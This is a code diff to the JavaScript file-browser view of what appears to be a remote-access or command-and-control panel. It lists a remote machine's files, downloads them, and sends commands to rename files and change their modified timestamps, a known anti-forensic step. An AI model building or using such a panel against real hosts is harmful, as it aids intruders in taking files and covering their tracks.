@@ -331,90 +331,125 @@ class index{
             }
         }
         renderFileList(fileContent, shell_dir = "") {
-            const div_file = document.getElementById('file_resp');
-            div_file.innerHTML = '';
-            const dir_list = fileContent.split("\n");
-            for (let i = 0; i < dir_list.length; i++) {
-                let file = dir_list[i].trim();
-                if (!file) continue;
-                let new_file = document.createElement('div');
-                new_file.classList.add('directory');
-                let isDir = file.startsWith("dir ");
-                let isFil = file.startsWith("fil ");
-                let type = isDir ? "dir" : (isFil ? "fil" : null);
-                if (!type) continue;
-                let match = file.match(/^(\w+)\s+(.+?)<([^<>]+)><([^<>]+)>$/);
-                let matchFile = file.match(/^(\w+)\s+(.+?)<([^<>]+)><([^<>]+)><([^<>]+)>$/);
-                let name = "", size = "", perm = "", mtime = "";
-                if (matchFile && type === "fil") {
-                    name = matchFile[2];
-                    size = matchFile[3];
-                    perm = matchFile[4];
-                    mtime = matchFile[5];
-                } else if (match && type === "dir") {
-                    name = match[2];
-                    perm = match[3];
-                    mtime = match[4];
-                } else {
-                    continue;
-                }
-                let full_path = shell_dir ? (shell_dir + "/" + name) : name;
-                let renameBtn = "<button class='rename-btn' style='margin-left:5px;'>✏️</button>";
-                let timeBtn = "<button class='time-btn' style='margin-left:5px;'>⏰</button>";
-                if (type === "dir") {
-                    new_file.classList.add('dir');
-                    new_file.innerHTML =
-                        '<span class="icon-dir">📁</span>' +
-                        '<span class="filename">' + name + '</span>' +
-                        '<span class="fileperm">&lt;' + perm + '&gt;</span>' +
-                        '<span class="filetime">&lt;' + mtime + '&gt;</span>' +
-                        renameBtn + timeBtn;
-                    new_file.onclick = () => {
-                        this.move_file(0, name);
-                    };
-                } else {
-                    new_file.classList.add('file');
-                    new_file.innerHTML =
-                        '<span class="icon-file">📄</span>' +
-                        '<span class="filename">' + name + '</span>' +
-                        '<span class="filesize">&lt;' + size + '&gt;</span>' +
-                        '<span class="fileperm">&lt;' + perm + '&gt;</span>' +
-                        '<span class="filetime">&lt;' + mtime + '&gt;</span>' +
-                        '<span class="icon-download" style="cursor:pointer;">⬇️</span>' +
-                        renameBtn + timeBtn;
-                    new_file.addEventListener('click', () => {
-                        this.getFile(full_path);
-                    });
-                    new_file.querySelector('.icon-download')?.addEventListener('click', (e) => {
-                        e.stopPropagation();
-                        this.getFile(full_path);
-                    });
-                }
-                new_file.querySelector('.rename-btn')?.addEventListener('click', (e) => {
-                    e.stopPropagation();
-                    const filenameSpan = new_file.querySelector('.filename');
-                    const oldName = filenameSpan.innerText;
-                    const newName = prompt("Enter the new name:", oldName);
-                    if (newName && newName !== oldName) {
-                        const cmd = "CHANG_FILE_NAME^" + full_path + "^" + newName;
-                        fetch(this.server + "/`+web_route+`?op=msg&uid=" + this.uid + "&msg=" + encodeURIComponent(cmd)+"&Taskid="+TaskId);
-                        filenameSpan.innerText = newName;
-                    }
-                });
-                new_file.querySelector('.time-btn')?.addEventListener('click', (e) => {
-                    e.stopPropagation();
-                    const filenameSpan = new_file.querySelector('.filename');
-                    const currentName = filenameSpan.innerText; // **最新的文件名**
-                    const newTime = prompt("Enter the new modified time (format: YYYY-MM-DD HH:mm:ss):");
-                    if (newTime) {
-                        const cmd = "CHANG_FILE_TIME^" + currentName + "^" + newTime;
-                        fetch(this.server + "/`+web_route+`?op=msg&uid=" + this.uid + "&msg=" + encodeURIComponent(cmd)+"&Taskid="+TaskId);
-                        new_file.querySelector('.filetime').innerText = "<" + newTime + ">";
-                    }
-                });
-                div_file.appendChild(new_file);
-            }
-        }
+		    const div_file = document.getElementById('file_resp');
+		    div_file.innerHTML = '';
+		    const dir_list = fileContent.split("\n");
+		
+		    for (let i = 0; i < dir_list.length; i++) {
+		        let file = dir_list[i].trim();
+		        if (!file) continue;
+		
+		        let new_file = document.createElement('div');
+		        new_file.classList.add('directory');
+		
+		        let isDir = file.startsWith("dir ");
+		        let isFil = file.startsWith("fil ");
+		        let type = isDir ? "dir" : (isFil ? "fil" : null);
+		        if (!type) continue;
+		
+		        let match = file.match(/^(\w+)\s+(.+?)<([^<>]+)><([^<>]+)>$/);
+		        let matchFile = file.match(/^(\w+)\s+(.+?)<([^<>]+)><([^<>]+)><([^<>]+)>$/);
+		
+		        let name = "", size = "", perm = "", mtime = "";
+		        if (matchFile && type === "fil") {
+		            name = matchFile[2];
+		            size = matchFile[3];
+		            perm = matchFile[4];
+		            mtime = matchFile[5];
+		        } else if (match && type === "dir") {
+		            name = match[2];
+		            perm = match[3];
+		            mtime = match[4];
+		        } else {
+		            continue;
+		        }
+		
+		        let full_path = shell_dir ? (shell_dir + "/" + name) : name;
+		        new_file.dataset.path = full_path; 
+		
+		        let renameBtn = "<button class='rename-btn' style='margin-left:5px;'>✏️</button>";
+		        let timeBtn   = "<button class='time-btn' style='margin-left:5px;'>⏰</button>";
+		
+		        if (type === "dir") {
+		            new_file.classList.add('dir');
+		            new_file.innerHTML =
+		                '<span class="icon-dir">📁</span>' +
+		                '<span class="filename">' + name + '</span>' +
+		                '<span class="fileperm">&lt;' + perm + '&gt;</span>' +
+		                '<span class="filetime">&lt;' + mtime + '&gt;</span>' +
+		                renameBtn + timeBtn;
+		
+		            new_file.onclick = () => {
+		                this.move_file(0, name);
+		            };
+		        } else {
+		            new_file.classList.add('file');
+		            new_file.innerHTML =
+		                '<span class="icon-file">📄</span>' +
+		                '<span class="filename">' + name + '</span>' +
+		                '<span class="filesize">&lt;' + size + '&gt;</span>' +
+		                '<span class="fileperm">&lt;' + perm + '&gt;</span>' +
+		                '<span class="filetime">&lt;' + mtime + '&gt;</span>' +
+		                '<span class="icon-download" style="cursor:pointer;">⬇️</span>' +
+		                renameBtn + timeBtn;
+		            new_file.addEventListener('click', () => {
+		                this.getFile(new_file.dataset.path);
+		            });
+		            new_file.querySelector('.icon-download')?.addEventListener('click', (e) => {
+		                e.stopPropagation();
+		                this.getFile(new_file.dataset.path);
+		            });
+		        }
+		
+		        // === 重命名 ===
+		        new_file.querySelector('.rename-btn')?.addEventListener('click', (e) => {
+		            e.stopPropagation();
+		
+		            const filenameSpan = new_file.querySelector('.filename');
+		            const oldName = filenameSpan.innerText;
+		            const oldPath = new_file.dataset.path;
+		
+		            const newName = prompt("Enter the new name:", oldName);
+		            if (!newName || newName === oldName) return;
+		
+		            const lastSlash = oldPath.lastIndexOf('/');
+		            const dirPath = lastSlash >= 0 ? oldPath.substring(0, lastSlash) : '';
+		            const newPath = dirPath ? (dirPath + '/' + newName) : newName;
+		
+		            const cmd = "CHANG_FILE_NAME^" + oldPath + "^" + newName;
+		            fetch(
+		                this.server + "/" + web_route +
+		                "?op=msg&uid=" + this.uid +
+		                "&msg=" + encodeURIComponent(cmd) +
+		                "&Taskid=" + TaskId
+		            );
+		
+		            filenameSpan.innerText = newName;
+		            new_file.dataset.path = newPath; // ⭐ 状态同步
+		        });
+		
+		        // === 修改时间 ===
+		        new_file.querySelector('.time-btn')?.addEventListener('click', (e) => {
+		            e.stopPropagation();
+		
+		            const currentPath = new_file.dataset.path;
+		            const newTime = prompt("Enter the new modified time (format: YYYY-MM-DD HH:mm:ss):");
+		            if (!newTime) return;
+		
+		            const cmd = "CHANG_FILE_TIME^" + currentPath + "^" + newTime;
+		            fetch(
+		                this.server + "/" + web_route +
+		                "?op=msg&uid=" + this.uid +
+		                "&msg=" + encodeURIComponent(cmd) +
+		                "&Taskid=" + TaskId
+		            );
+		
+		            new_file.querySelector('.filetime').innerText = "<" + newTime + ">";
+		        });
+		
+		        div_file.appendChild(new_file);
+		    }
+		}
         async history_file() {
             if (this.uid) {
                 const fileResponse = await fetch(this.server + "/`+web_route+`?op=readFileList&uid=" + this.uid);
